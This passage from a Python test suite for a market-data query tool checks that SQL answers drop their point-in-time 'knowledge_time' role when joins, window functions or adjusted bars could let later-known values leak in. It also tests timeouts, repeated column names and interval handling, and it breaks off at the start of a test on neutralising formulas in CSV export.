        kept, notes, rows_of = role(sql)
        assert kept is None and notes[-1] == refused, sql
        assert rows_of == RowsOf(
            model="marketlens.QueryRow", fetched_at=known.provenance.fetched_at, shown=False
        ), sql
    for sql in (
        f"SELECT {week}, max(knowledge_time) AS knowledge_time FROM {k} GROUP BY ALL",
        f"WITH w AS (SELECT * FROM {k} WHERE value > 1) SELECT event_time, knowledge_time FROM w",
        f"SELECT event_time, a.value, b.value AS b_value, greatest(a.knowledge_time, b.knowledge_time) "
        f"AS knowledge_time FROM {k} a JOIN {o} b USING (event_time)",
    ):
        kept, notes, rows_of = role(sql)
        assert kept == "available" and not any("keeps no role" in n for n in notes) and rows_of is None, sql


def test_a_query_computing_rows_from_other_rows_keeps_no_role(setup):
    """Review of N2, round 3: a clock passed through kept its role beside
    values the query computed from other rows, some known later (a
    full-sample z-score, lead(), a forward frame, a filter on the result's
    maximum, a self-join on the next day, quotes joined forward from each row),
    and analytics_align said the answer was point in time. Such a query keeps
    no role, and its note says why; rows built from their own rows (a filter,
    a union, a fetched list of exchanges joined) keep it, and a quotes result
    joined keeps it with the quotes' time as the answer's time column, or in
    the clock. Round 8: rows computed from others show not when they became
    known, so analytics_align refuses such an answer unless match_on=time.
    Round 9: so it refuses quotes joined forward, matched before from the
    dataset's clock, which the quotes' time is not in."""
    from marketlens_schema.market import Quote

    ctx, store, *_ = setup
    known, other = _known_result(store), _known_result(store)
    quotes = store.put(
        rows_to_table(quote_rows(), Quote),
        tool="market_quotes",
        model=Quote.schema_name,
        provenance=provenance(),
    )
    k, o, b = known.result_id, other.result_id, quotes.result_id
    exchanges = store.put(
        rows_to_table(
            [StockExchange(code="P", name="NYSE Arca"), StockExchange(code="Q", name="NASDAQ")], StockExchange
        ),
        tool="reference_stock_exchanges",
        model=StockExchange.schema_name,
        provenance=provenance(),
    ).result_id

    def stored(sql):
        out = call(ctx, "results_query", sql=sql, store=True)
        info = store.info(out.result_id)
        return {c.name: c.role for c in info.columns}.get("knowledge_time"), info.time_column, out.notes

    def lost(why):
        return (
            f"The answer's knowledge_time keeps no role available (when each row became known): {why}. "
            "analytics_align refuses the answer unless match_on=time, as nothing shows when its rows became known."
        )

    window = lost(
        "its query computes rows from other rows, some known later, with a window function (avg() OVER (), "
        "lead(), a QUALIFY filter); align first and compute over the aligned answer to stay point in time"
    )

    def subquery(rid):
        return lost(
            f"its query reads {rid} in a subquery inside an expression (a scalar subquery, IN or EXISTS) or a SEMI "
            "or ANTI join, so a row can depend on other rows, some known later"
        )

    self_join = lost(
        f"its query reads {k} twice for one row (a self-join), so a row can hold another row's values, known later"
    )
    lateral = lost(
        f"its query reads {k} in a LATERAL subquery (one run for each row it joins), so a row can depend on other "
        "rows, some known later"
    )
    # Round 9: refused too, as the quotes' time is in neither the answer's time column nor the clock.
    forward = lost(
        f"it joins {b}, whose rows are dated by t, without passing t through as its time column or taking "
        f"greatest() of it and the clock, so a row can hold a {b} row dated after it (an ASOF JOIN forward, say)"
    )
    cols = "event_time, knowledge_time"
    next_day = "ON c.event_time = a.event_time + INTERVAL 1 DAY"
    for sql, note in {
        f"SELECT {cols}, value - avg(value) OVER () AS value FROM {k}": window,
        f"SELECT {cols}, lead(value) OVER (ORDER BY event_time) AS value FROM {k}": window,
        f"SELECT {cols}, avg(value) OVER (ORDER BY event_time ROWS BETWEEN CURRENT ROW AND 2 FOLLOWING) AS value "
        f"FROM {k}": window,
        f"SELECT * FROM {k} QUALIFY row_number() OVER (ORDER BY value DESC) = 1": window,
        f"SELECT event_time, max(knowledge_time) OVER () AS knowledge_time FROM {k}": window,
        f"SELECT * FROM (SELECT {cols}, lag(value) OVER (ORDER BY event_time) AS value FROM {k}) s": window,
        f"SELECT * FROM {k} WHERE value >= (SELECT max(value) - 1 FROM {k})": subquery(k),
        f"SELECT {cols}, value - (SELECT avg(value) FROM {k}) AS value FROM {k}": subquery(k),
        f"SELECT * FROM {k} WHERE event_time IN (SELECT event_time - INTERVAL 1 DAY FROM {o})": subquery(o),
        f"SELECT a.* FROM {k} a SEMI JOIN {k} c {next_day}": subquery(k),
        f"SELECT a.event_time, a.knowledge_time, l.value FROM {k} a, LATERAL (SELECT avg(value) AS value FROM {k} c "
        "WHERE c.event_time >= a.event_time) l": lateral,
        f"SELECT a.event_time, a.knowledge_time, c.value FROM {k} a JOIN {k} c {next_day}": self_join,
        f"WITH w AS (SELECT * FROM {k}) SELECT a.event_time, a.knowledge_time, c.value FROM w a JOIN w c "
        f"{next_day}": self_join,
        f"SELECT a.*, m.top FROM {k} a, (SELECT max(value) AS top FROM {k}) m": self_join,
        f"SELECT m.*, s.bid_price FROM {k} m ASOF JOIN {b} s ON s.t >= m.event_time": forward,
        f"SELECT m.*, s.bid_price FROM {k} m, (SELECT max(bid_price) AS bid_price FROM {b}) s": forward,
    }.items():
        role, _, notes = stored(sql)
        assert role is None and notes[-1] == note, sql
    for sql, time_column in {
        f"SELECT * FROM {k} WHERE value > 1 UNION ALL SELECT * FROM {k} WHERE value <= 1": "event_time",
        f"SELECT m.*, x.name FROM {k} m, {exchanges} x": None,
        f"SELECT s.t, s.bid_price, m.value, m.knowledge_time FROM {b} s ASOF JOIN {k} m ON s.t >= m.event_time": (
            "t"
        ),
        f"SELECT m.event_time, m.value, s.bid_price, greatest(m.knowledge_time, s.t) AS knowledge_time FROM {k} m "
        f"ASOF JOIN {b} s ON s.t >= m.event_time": None,
    }.items():
        role, kept_time, notes = stored(sql)
        assert (role, kept_time) == ("available", time_column) and not any(
            "keeps no role" in n for n in notes
        ), sql


def test_an_answer_reading_a_result_that_does_not_show_when_its_rows_became_known_keeps_no_role(setup):
    """Review of N2, round 4: an answer that lost the role (a full-sample
    z-score) was read as known at its time column when joined back to the
    dataset, and an undated one (the full-sample mean) as known always, so the
    join kept the role and analytics_align again called a look-ahead value
    point in time; so did a daily high of bars stored without a recorded time
    column, joined forward. A result read keeps the answer's role only when it
    shows when its rows became known: by a column with the role, or as fetched
    rows known at their time column (bars) or at every time (exchanges).
    Round 8: a result that dates its rows otherwise than as the rows it read,
    or not at all (the full-sample mean), shows not when they became known,
    so analytics_align refuses an answer reading it unless match_on=time."""
    ctx, store, _, small, *_ = setup
    k, b = _known_result(store).result_id, small.result_id
    ts = pa.timestamp("us", tz="UTC")
    t0 = dt.datetime(2026, 1, 5, tzinfo=dt.UTC)

    def stored(sql):
        out = call(ctx, "results_query", sql=sql, store=True)
        return {c.name: c.role for c in store.info(out.result_id).columns}.get("knowledge_time"), out.notes

    def lost(why, refused=False):
        return (
            f"The answer's knowledge_time keeps no role available (when each row became known): {why}. "
            + (
                "analytics_align refuses the answer unless match_on=time, as nothing shows when its rows became known."
                if refused
                else "analytics_align says a match on the answer is not shown point in time, and matches each row from "
                "the later of its time column and knowledge_time, a lower bound on when it became known."
            )
        )

    def computed(rid, refused=False):
        # Round 8: reading a result marked not shown (a window's, a bucket of bars) is refused too.
        return lost(
            f"it reads {rid}, which was computed by results_query with no column of role available (when each row "
            "became known), so its rows can hold values known after their time (a full-sample average, lead(), a "
            "bucket dated at its start); read the results it was computed from in this query instead",
            refused,
        )

    z = call(
        ctx,
        "results_query",
        sql=f"SELECT event_time, knowledge_time, value - avg(value) OVER () AS z FROM {k}",
        store=True,
    ).result_id
    assert store.info(z).time_column == "event_time"
    assert {c.name: c.role for c in store.info(z).columns}["knowledge_time"] is None
    mu = call(ctx, "results_query", sql=f"SELECT avg(value) AS mu FROM {k}", store=True).result_id
    assert store.info(mu).rows_of is not None and not store.info(mu).rows_of.shown
    daily = call(
        ctx,
        "results_query",
        sql=f"SELECT time_bucket(INTERVAL 1 DAY, t) AS day, max(close) AS hi FROM {b} GROUP BY 1",
        store=True,
    ).result_id
    assert store.info(daily).time_column is None
    tickers = call(ctx, "results_query", sql=f"SELECT DISTINCT ticker FROM {b}", store=True).result_id
    macro = store.put(
        pa.table(
            {
                "series_id": ["CPI"] * 2,
                "t": pa.array([t0, t0 + dt.timedelta(days=1)], ts),
                "value": [1.0, 2.0],
            }
        ),
        tool="research_macro_series",
        model="marketlens.QueryRow",
        provenance=provenance(),
        time_column="t",
    ).result_id
    actions = store.put(
        pa.table({"ticker": ["AAPL"], "ex_date": pa.array([dt.date(2026, 1, 9)], pa.date32())}),
        tool="reference_corporate_actions",
        model="marketlens.QueryRow",
        provenance=provenance(),
    ).result_id
    for sql, note in {
        f"SELECT z.event_time, k.knowledge_time, z.z AS value FROM {k} k JOIN {z} z ON z.event_time = k.event_time": (
            computed(z, refused=True)
        ),
        f"SELECT k.event_time, k.knowledge_time, k.value - m.mu AS value FROM {k} k, {mu} m": computed(
            mu, refused=True
        ),
        f"SELECT m.*, x.hi FROM {k} m ASOF JOIN {daily} x ON x.day >= m.event_time": computed(
            daily, refused=True
        ),
        f"SELECT m.*, x.hi FROM {k} m, (SELECT max(hi) AS hi FROM {daily}) x": computed(daily, refused=True),
        f"SELECT m.*, u.ticker FROM {k} m, {tickers} u": computed(tickers, refused=True),
        f"SELECT s.t, m.knowledge_time, s.value FROM {macro} s ASOF JOIN {k} m ON s.t >= m.event_time": lost(
            f"it reads {macro}, which holds marketlens.QueryRow rows with no column of role available (when each "
            "became known), dated by t, the time a row describes, which can be before it was published (only fetched "
            "market data, such as quotes or bars, is taken as known by its time)"
        ),
        f"SELECT m.*, a.ex_date FROM {k} m, {actions} a": lost(
            f"it reads {actions}, which holds rows dated (ex_date) with neither a time column nor a column of role "
            "available (when each became known), so a row can be dated or published after the time it is put beside"
        ),
    }.items():
        role, notes = stored(sql)
        assert role is None and notes[-1] == note, sql
    # An answer that kept the role shows when its rows became known: joined
    # to the dataset with greatest() of both clocks, the role stays.
    kept = call(ctx, "results_query", sql=f"SELECT * FROM {k} WHERE value > 1", store=True).result_id
    role, notes = stored(
        f"SELECT a.event_time, a.value, greatest(a.knowledge_time, p.knowledge_time) AS knowledge_time "
        f"FROM {k} a JOIN {kept} p USING (event_time)"
    )
    assert role == "available" and not any("keeps no role" in n for n in notes)


def test_rows_as_fetched_or_changed_after_their_time_keep_no_role(setup):
    """Review of N2, round 5: any fetched rows with no date were taken as known
    at every time, and any built-in rows with a time column as known then, so a
    position's P&L of today, an asset's status, a plugin's period held as text
    or an order's fill a week after it was placed, joined to the dataset, kept
    the role, and analytics_align called the match point in time. Only rows
    known at their time column and fixed from then on (bars, quotes, trades),
    or that hold at every time (exchanges), keep it."""
    from marketlens_schema.market import Asset, Quote
    from marketlens_schema.portfolio import Order, Position

    ctx, store, _, _, news, _ = setup
    k = _known_result(store).result_id
    t0 = dt.datetime(2026, 1, 5, tzinfo=dt.UTC)

    def fetched(rows, model, tool):
        return store.put(
            rows_to_table(rows, model), tool=tool, model=model.schema_name, provenance=provenance()
        ).result_id

    pos = fetched(
        [
            Position(
                environment="paper",
                asset_class="us_equity",
                ticker="SPY",
                side="long",
                qty="10",
                avg_entry_price="400",
                cost_basis="4000",
                current_price="568",
                unrealized_plpc=0.42,
            )
        ],
        Position,
        "account_positions",
    )
    assets = fetched(
        [Asset(ticker="SPY", asset_class="us_equity", status="active", tradable=True, shortable=True)],
        Asset,
        "reference_assets",
    )
    orders = fetched(
        [
            Order(
                environment="paper",
                order_id="o1",
                asset_class="us_equity",
                ticker="SPY",
                side="buy",
                status="filled",
                filled_qty="10",
                filled_avg_price="555",
                created_at=t0,
                filled_at=t0 + dt.timedelta(days=7),
            )
        ],
        Order,
        "account_orders",
    )
    quotes = fetched(quote_rows(), Quote, "market_quotes")
    text = store.put(
        pa.table({"period": ["2026-01-09"], "eps": [7.0]}),
        tool="research_earnings",
        model="marketlens.QueryRow",
        provenance=provenance(),
    ).result_id

    def stored(sql):
        out = call(ctx, "results_query", sql=sql, store=True)
        return {c.name: c.role for c in store.info(out.result_id).columns}.get("knowledge_time"), out.notes

    def lost(why):
        return (
            f"The answer's knowledge_time keeps no role available (when each row became known): {why}. "
            "analytics_align says a match on the answer is not shown point in time, and matches each row from the "
            "later of its time column and knowledge_time, a lower bound on when it became known."
        )

    def undated(rid, model):
        return lost(
            f"it reads {rid}, which holds {model} rows with no date column, as fetched at 2026-10-04T21:00Z, so "
            "nothing shows a row was known before then (a position's price or an asset's status is as of then, and "
            "a date held as text is not read as one)"
        )

    def later(rid, model, col):
        return lost(
            f"it reads {rid}, which holds {model} rows with no column of role available (when each became known), "
            f"as fetched at 2026-10-04T21:00Z, which can hold what became known after their time column {col} (an "
            "order's later fill, a news item's update, a day's activity placed at its start)"
        )

    for sql, note in {
        f"SELECT k.event_time, k.knowledge_time, k.value * p.unrealized_plpc AS value FROM {k} k, {pos} p": (
            undated(pos, "marketlens.Position")
        ),
        f"SELECT k.* FROM {k} k, {assets} a WHERE a.shortable": undated(assets, "marketlens.Asset"),
        f"SELECT k.event_time, k.knowledge_time, v.eps AS value FROM {k} k JOIN {text} v "
        "ON CAST(v.period AS DATE) = CAST(k.event_time AS DATE) + 4": undated(text, "marketlens.QueryRow"),
        f"SELECT k.event_time, greatest(k.knowledge_time, o.created_at) AS knowledge_time, o.filled_avg_price AS "
        f"value FROM {k} k ASOF JOIN {orders} o ON k.event_time >= o.created_at": later(
            orders, "marketlens.Order", "created_at"
        ),
        f"SELECT k.event_time, greatest(k.knowledge_time, n.created_at) AS knowledge_time, n.headline FROM {k} k "
        f"ASOF JOIN {news.result_id} n ON k.event_time >= n.created_at": later(
            news.result_id, "marketlens.NewsItem", "created_at"
        ),
    }.items():
        role, notes = stored(sql)
        assert role is None and notes[-1] == note, sql
    # Quotes are known at their time and fixed from then on, as bars are.
    role, notes = stored(
        f"SELECT k.event_time, k.value, q.bid_price, greatest(k.knowledge_time, q.t) AS knowledge_time FROM {k} k "
        f"ASOF JOIN {quotes} q ON k.event_time >= q.t"
    )
    assert role == "available" and not any("keeps no role" in n for n in notes)


def test_bars_are_known_only_at_their_end_so_an_answer_joining_them_keeps_no_role(setup):
    """Review of N2, round 6: a bar was taken as known at its start t, so a
    dataset's row joined to the day's bar with greatest(knowledge_time, t)
    kept the role beside that day's close, known only when the session ended,
    and analytics_align called the match point in time; bars adjusted for
    splits and dividends after their time (market_bars' default) were taken as
    fixed too, so a value divided by a close kept the role. A bar is known
    only at its end, which no column of a query answer shows, and adjusted
    bars not even then: an answer joining them keeps no role, with a note.
    Round 8: the note said analytics_align matched it from a lower bound; it
    refuses it unless match_on=time, and the note says so."""
    ctx, store, *_ = setup
    k = _known_result(store).result_id
    t0 = dt.datetime(2026, 1, 4, 5, tzinfo=dt.UTC)

    def fetched(request):
        rows = bar_rows(tickers=("SPY",), n=3, start=t0, minutes=1440)
        rows = [r.model_copy(update={"timeframe": "1d"}) for r in rows]
        return store.put(
            rows_to_table(rows, Bar),
            tool="market_bars",
            model=Bar.schema_name,
            provenance=provenance(request=request),
        ).result_id

    raw, adjusted = fetched({"adjustment": "raw"}), fetched({"adjustment": "all"})

    def stored(sql):
        out = call(ctx, "results_query", sql=sql, store=True)
        return {c.name: c.role for c in store.info(out.result_id).columns}.get("knowledge_time"), out.notes

    def lost(why):
        return (
            f"The answer's knowledge_time keeps no role available (when each row became known): {why}. "
            "analytics_align refuses the answer unless match_on=time, as nothing shows when its rows became known."
        )

    at_end = lost(
        f"it reads {raw}, which holds marketlens.Bar rows dated by their start t and known only at their end (t plus "
        "their timeframe), which no column of the answer shows; align them with analytics_align instead, which "
        "matches each bar from its end"
    )
    rescaled = lost(
        f"it reads {adjusted}, which holds marketlens.Bar rows adjusted for corporate actions (adjustment=all) as "
        "fetched at 2026-10-04T21:00Z: their prices are rescaled for each split or dividend up to then, after "
        "their time too, so a price level holds what became known later (a return between two of them does not); fetch "
        "them with adjustment=raw to match point in time"
    )
    clock = "greatest(k.knowledge_time, b.t) AS knowledge_time"
    for sql, note in {
        f"SELECT k.event_time, {clock}, k.value, b.close FROM {k} k ASOF JOIN {raw} b ON k.knowledge_time >= b.t": (
            at_end
        ),
        f"SELECT b.t, b.close, k.value, k.knowledge_time FROM {raw} b ASOF JOIN {k} k ON b.t >= k.knowledge_time": (
            at_end
        ),
        f"SELECT k.event_time, {clock}, k.value / b.close AS value FROM {k} k ASOF JOIN {adjusted} b "
        "ON k.knowledge_time >= b.t": rescaled,
    }.items():
        role, notes = stored(sql)
        assert role is None and notes[-1] == note, sql


def test_an_answer_passing_fetched_market_data_through_records_the_fetch(setup):
    """Review of N2, round 6: an answer of one result was taken as computed,
    so analytics_align onto bars filtered to one ticker (what its own refusal
    of several series advises) said the match was not shown point in time,
    blaming a full-sample average or lead() the query never had. An answer
    that passes the rows of one fetched result of market data through
    unchanged (rows filtered or grouped, columns projected or computed from
    each row's own, its time column and a bar's timeframe kept as they are)
    records that result's model, fetch time and adjustment (rows_of), also
    after the result is gone, and the one timeframe of its bars when it leaves
    that column out. Round 7: any other answer computed from market data
    records it marked not shown, so analytics_align refuses it unless
    match_on=time, where it matched a bucket or lead() on its start. Round 8:
    so does an answer computing its time column (a bucket dated at its
    start) or rows from others from quotes, trades or a dataset's rows; one
    whose rows are dated as theirs (a filter, a bucket dated at the last of
    its quotes, quotes joined to exchange codes) records none."""
    from marketlens_schema.market import Quote

    ctx, store, bars, *_ = setup
    b = bars.result_id
    adjusted = store.put(
        bar_table(n=5),
        tool="market_bars",
        model=Bar.schema_name,
        provenance=provenance(request={"adjustment": "all"}),
    ).result_id
    quotes = store.put(
        rows_to_table(quote_rows(), Quote),
        tool="market_quotes",
        model=Quote.schema_name,
        provenance=provenance(),
    ).result_id
    fetched_at = dt.datetime(2026, 10, 4, 21, tzinfo=dt.UTC)

    def rows_of(sql):
        out = call(ctx, "results_query", sql=sql, store=True)
        return store.info(out.result_id).rows_of, out.result_id

    as_bars = RowsOf(model=Bar.schema_name, fetched_at=fetched_at)
    for sql in (
        f"SELECT * FROM {b} WHERE ticker = 'MSFT'",
        f"SELECT ticker, t, timeframe, close * 2 AS close FROM {b} WHERE close > 100.6",
        f"SELECT t, timeframe, avg(close) AS close FROM {b} GROUP BY t, timeframe",
        f"SELECT ticker, max(t) AS t, timeframe, max(high) AS high FROM {b} GROUP BY ticker, timeframe",
        f"WITH m AS (SELECT * FROM {b} WHERE ticker = 'MSFT') SELECT * FROM m",
    ):
        assert rows_of(sql)[0] == as_bars, sql
    one_minute = as_bars.model_copy(update={"span": "1min"})
    assert rows_of(f"SELECT ticker, t, close FROM {b} WHERE ticker = 'MSFT'")[0] == one_minute
    mixed = store.put(
        rows_to_table(
            bar_rows(tickers=("SPY",), n=2)
            + [r.model_copy(update={"timeframe": "1d"}) for r in bar_rows(n=1)],
            Bar,
        ),
        tool="market_bars",
        model=Bar.schema_name,
        provenance=provenance(),
    ).result_id
    assert rows_of(f"SELECT * FROM {mixed}")[0] == as_bars
    for sql in (
        f"SELECT ticker, t, close FROM {mixed}",
        f"SELECT ticker, t AS bar_t, timeframe, close FROM {b}",
        f"SELECT ticker, t + INTERVAL 1 MINUTE AS t, timeframe, close FROM {b}",
        f"SELECT ticker, min(t) AS t, timeframe, avg(close) AS close FROM {b} GROUP BY ticker, timeframe",
        f"SELECT ticker, t, timeframe, lead(close) OVER (PARTITION BY ticker ORDER BY t) AS close FROM {b}",
        f"SELECT * FROM {b} WHERE close > (SELECT avg(close) FROM {b})",
        f"SELECT a.ticker, a.t, a.timeframe, c.close FROM {b} a JOIN {b} c ON c.t = a.t + INTERVAL 1 MINUTE",
        f"SELECT time_bucket(INTERVAL 5 MINUTE, t) AS t, '5min' AS timeframe, max(close) AS close FROM {b} GROUP BY 1",
        f"SELECT a.* FROM {b} a JOIN {quotes} q USING (t)",
    ):
        assert rows_of(sql)[0] == as_bars.model_copy(update={"shown": False}), sql
    # Quotes are known at their time: an answer dating its rows otherwise, or
    # computing rows from others, records them marked not shown.
    as_quotes = RowsOf(model=Quote.schema_name, fetched_at=fetched_at, shown=False)
    exchanges = store.put(
        rows_to_table([StockExchange(code="P", name="NYSE Arca")], StockExchange),
        tool="reference_stock_exchanges",
        model=StockExchange.schema_name,
        provenance=provenance(),
    ).result_id
    for sql in (
        f"SELECT time_bucket(INTERVAL 1 MINUTE, t) AS t, max(bid_price) AS bid FROM {quotes} GROUP BY 1",
        f"SELECT time_bucket(INTERVAL 1 MINUTE, t) AS minute, max(bid_price) AS bid FROM {quotes} GROUP BY 1",
        f"SELECT CAST(CAST(t AS DATE) AS TIMESTAMPTZ) AS t, bid_price FROM {quotes}",
        f"SELECT ticker, t, lead(bid_price) OVER (PARTITION BY ticker ORDER BY t) AS bid FROM {quotes}",
        f"SELECT t, bid_price FROM {quotes} WHERE bid_price > (SELECT avg(bid_price) FROM {quotes})",
    ):
        assert rows_of(sql)[0] == as_quotes, sql
    # A bucket dated at its last quote passes the quotes through; quotes joined to codes record none.
    last = f"SELECT max(t) AS t, ticker, max(bid_price) AS bid FROM {quotes} GROUP BY ticker, time_bucket(INTERVAL 1 MINUTE, t)"
    assert rows_of(last)[0] == as_quotes.model_copy(update={"shown": True})
    assert rows_of(f"SELECT q.t, q.bid_price, x.name FROM {quotes} q, {exchanges} x")[0] is None
    # Two fetches of codes that hold at every time, joined: no time to join them on, nothing recorded.
    again = store.put(
        rows_to_table([StockExchange(code="P", name="NYSE Arca")], StockExchange),
        tool="reference_stock_exchanges",
        model=StockExchange.schema_name,
        provenance=provenance(),
    ).result_id
    assert rows_of(f"SELECT x.code, y.name FROM {exchanges} x JOIN {again} y USING (code)")[0] is None
    kept, rid = rows_of(f"SELECT * FROM {adjusted} WHERE ticker = 'AAPL'")
    assert kept == RowsOf(model=Bar.schema_name, fetched_at=fetched_at, adjustment="all")
    # A pass-through of a pass-through keeps the fetch it passes through, and
    # so does a stored answer once that fetch is gone.
    store.drop(adjusted)
    assert rows_of(f"SELECT * FROM {rid} WHERE close > 0")[0] == kept
    no_span, rid = rows_of(f"SELECT ticker, t, close FROM {rid}")
    assert no_span == kept.model_copy(update={"span": "1min"})
    assert rows_of(f"SELECT t, close FROM {rid} WHERE ticker = 'AAPL'")[0] == no_span
    assert rows_of(f"SELECT * FROM {quotes} WHERE bid_price > 101")[0] == RowsOf(
        model=Quote.schema_name, fetched_at=fetched_at
    )


def test_only_market_and_reference_models_fixed_once_known_are_known_at_their_time():
    """The built-in models whose fetched rows marketlens takes as known at
    their time column without a column of role available, or at every time
    with none: market data fixed once known and reference codes, never
    account data, news, assets or calendars."""
    from marketlens_schema import BUILTIN_MODELS

    assert sorted(n for n, m in BUILTIN_MODELS.items() if m.known_at_time) == [
        f"marketlens.{n}"
        for n in sorted(
            (
                "Bar",
                "ConditionCode",
                "FixedIncomeQuote",
                "MarketClock",
                "OptionBar",
                "OptionExchange",
                "OptionQuote",
                "OptionTrade",
                "OrderBookLevel",
                "Quote",
                "StockExchange",
                "Trade",
            )
        )
    ]
    # A snapshot holds values as of its fetch (open interest, greeks, a
    # session still trading): known only then (round 7).
    assert sorted(n for n, m in BUILTIN_MODELS.items() if m.known_at_fetch) == [
        "marketlens.OptionSnapshot",
        "marketlens.Snapshot",
    ]
    assert not any(m.known_at_time and m.known_at_fetch for m in BUILTIN_MODELS.values())
    # A bar covers t to t plus its timeframe, and is known only at its end.
    assert sorted(n for n, m in BUILTIN_MODELS.items() if m.span_column) == [
        "marketlens.Bar",
        "marketlens.OptionBar",
    ]
    for name, model in BUILTIN_MODELS.items():
        if model.known_at_time and model.time_column is None:
            assert not any("date" in str(f.annotation).lower() for f in model.model_fields.values()), name


def test_a_query_whose_rows_sqlglot_cannot_trace_keeps_no_role(setup, monkeypatch):
    """A query whose rows sqlglot cannot trace keeps no role, with a note:
    nothing shows each row computed from the rows it keeps the clocks of."""
    ctx, store, *_ = setup
    k = _known_result(store).result_id

    def untraceable(*args, **kwargs):
        raise rt.sqlglot.errors.OptimizeError("cannot trace")

    monkeypatch.setattr(rt, "traverse_scope", untraceable)
    out = call(ctx, "results_query", sql=f"SELECT * FROM {k}", store=True)
    assert {c.name: c.role for c in store.info(out.result_id).columns}["knowledge_time"] is None
    assert out.notes[-1].startswith(
        "The answer's knowledge_time keeps no role available (when each row became known): sqlglot cannot trace "
        "how its query computes rows."
    )


def test_a_whole_answer_that_runs_out_of_time_stores_the_rows_read_cut(setup, monkeypatch):
    """Review of N5: storing an answer too large to show runs it again
    without max_rows; when that run is stopped at the time limit, the rows the
    first run read are stored, flagged cut, instead of failing the query."""
    ctx, store, bars, *_ = setup
    first = store.query

    def query(sql, *, max_rows, store=False):
        if store:
            raise rt.QueryRefused("sql_timeout", "The query ran longer than 10 seconds and was stopped.")
        return first(sql, max_rows=max_rows, store=store)

    monkeypatch.setattr(store, "query", query)
    out = call(ctx, "results_query", sql=f"SELECT * FROM {bars.result_id}", max_rows=200)
    assert isinstance(out, ResultMarker) and out.row_count == 200
    assert out.provenance.truncated is True
    assert out.provenance.truncation_note == (
        "The answer is cut: the whole answer took longer than 10 seconds to run, so only the first 200 rows, read "
        "before, are kept. Aggregate or filter so that the whole answer runs in time."
    )
    assert any("so its first 200 rows were stored as a new result" in n for n in out.notes)

    def broken(sql, *, max_rows, store=False):
        if store:
            raise rt.QueryRefused("sql_error", "Binder Error: out of memory")
        return first(sql, max_rows=max_rows, store=store)

    # Any other refusal of the whole answer still fails the query.
    monkeypatch.setattr(store, "query", broken)
    with pytest.raises(ToolError, match="out of memory"):
        call(ctx, "results_query", sql=f"SELECT * FROM {bars.result_id}", max_rows=200)


def test_query_keeps_every_column_of_a_join_that_repeats_a_name(setup):
    """a.close, b.close came back as one close holding b's value inline, and
    with store=true failed as internal_error: a repeated name is renamed the
    way DuckDB names it (close_1), with a note."""
    ctx, _, _, small, *_ = setup
    rid = small.result_id
    sql = (
        f"SELECT a.t, a.close, b.close FROM {rid} a JOIN {rid} b ON a.t = b.t "
        f"WHERE a.ticker = 'AAPL' AND b.ticker = 'MSFT' ORDER BY a.t LIMIT 2"
    )
    out = call(ctx, "results_query", sql=sql)
    assert isinstance(out, InlineResult)
    assert [c.name for c in out.columns] == ["t", "close", "close_1"]
    assert [(r["close"], r["close_1"]) for r in out.rows] == [
        (pytest.approx(100.1), pytest.approx(110.1)),
        (pytest.approx(100.11), pytest.approx(110.11)),
    ]
    assert any(
        n.startswith("Repeated column names were renamed") and "close -> close_1" in n for n in out.notes
    )
    stored = call(ctx, "results_query", sql=sql, store=True)
    assert isinstance(stored, ResultMarker)
    assert [c.name for c in stored.columns] == ["t", "close", "close_1"]
    star = call(
        ctx, "results_query", sql=f"SELECT * FROM {rid} a JOIN {rid} b ON a.t = b.t AND a.ticker = b.ticker"
    )
    names = [c.name for c in star.columns]
    assert len(names) == 26 and len(set(names)) == 26
    assert all(set(names) - set(row) <= {"absent"} for row in star.rows)


def test_sample_of_a_repeated_column_shows_it_once(setup):
    ctx, _, bars, *_ = setup
    out = call(ctx, "results_sample", result_id=bars.result_id, n=2, columns=["close", "close"])
    assert [c.name for c in out.columns] == ["close"]
    assert all(set(row) == {"close"} for row in out.rows)


def test_query_answers_intervals_and_nanosecond_timestamps(setup):
    """An INTERVAL answered as [months, days, nanoseconds] inline and failed
    as internal_error when stored (Parquet has no Arrow month_day_nano type);
    a TIMESTAMP_NS with sub-microsecond digits failed even inline."""
    ctx, _, _, small, *_ = setup
    sql = f"SELECT t, t - lag(t) OVER (ORDER BY t) AS gap FROM {small.result_id} WHERE ticker = 'AAPL' ORDER BY t"
    out = call(ctx, "results_query", sql=sql)
    assert [r["gap"] for r in out.rows] == [None, "00:01:00", "00:01:00", "00:01:00", "00:01:00"]
    assert [c.type for c in out.columns] == ["TIMESTAMP WITH TIME ZONE", "VARCHAR"]
    assert any(n.startswith("Interval column(s) gap are text") for n in out.notes)
    stored = call(ctx, "results_query", sql=sql, store=True)
    assert isinstance(stored, ResultMarker)
    back = call(
        ctx, "results_query", sql=f"SELECT max(epoch(CAST(gap AS INTERVAL))) AS s FROM {stored.result_id}"
    )
    assert back.rows == [{"s": 60.0}]
    ns_sql = "SELECT TIMESTAMP_NS '2026-01-01 00:00:00.123456789' AS ns"
    ns = call(ctx, "results_query", sql=ns_sql)
    assert ns.rows == [{"ns": "2026-01-01T00:00:00.123456"}]
    assert any("ns are cut to microseconds" in n for n in ns.notes)
    assert isinstance(call(ctx, "results_query", sql=ns_sql, store=True), ResultMarker)


def test_query_answers_intervals_inside_a_list_struct_or_map(setup):
    """2026-10-19: only a top-level INTERVAL became text, so a list of them
    (list(t - t0), array_agg(gap)), or one in a struct or map, still showed
    [months, days, nanoseconds] inline and failed as internal_error stored."""
    ctx, _, _, small, *_ = setup
    sql = (
        "SELECT list(t - t0 ORDER BY t) AS gaps, {'gap': INTERVAL 1 DAY} AS s, MAP {'a': INTERVAL 3 HOUR} AS m "
        f"FROM (SELECT t, min(t) OVER () AS t0 FROM {small.result_id} WHERE ticker = 'AAPL')"
    )
    out = call(ctx, "results_query", sql=sql)
    assert out.rows == [
        {
            "gaps": "['00:00:00', '00:01:00', '00:02:00', '00:03:00', '00:04:00']",
            "s": "{'gap': 1 day}",
            "m": "{a='03:00:00'}",
        }
    ]
    assert [c.type for c in out.columns] == ["VARCHAR", "VARCHAR", "VARCHAR"]
    (note,) = [n for n in out.notes if n.startswith("Interval column(s) gaps, s, m are text")]
    assert "CAST(gaps AS INTERVAL[]) reads one back" in note
    stored = call(ctx, "results_query", sql=sql, store=True)
    assert isinstance(stored, ResultMarker)
    back = call(
        ctx,
        "results_query",
        sql=f"SELECT epoch(CAST(gaps AS INTERVAL[])[5]) AS s, epoch(CAST(s AS STRUCT(gap INTERVAL)).gap) AS d "
        f"FROM {stored.result_id}",
    )
    assert back.rows == [{"s": 240.0, "d": 86400.0}]


def test_csv_export_neutralises_third_party_formulas(setup):
    """A headline starting with = (or +, -, @) was written as is, so a
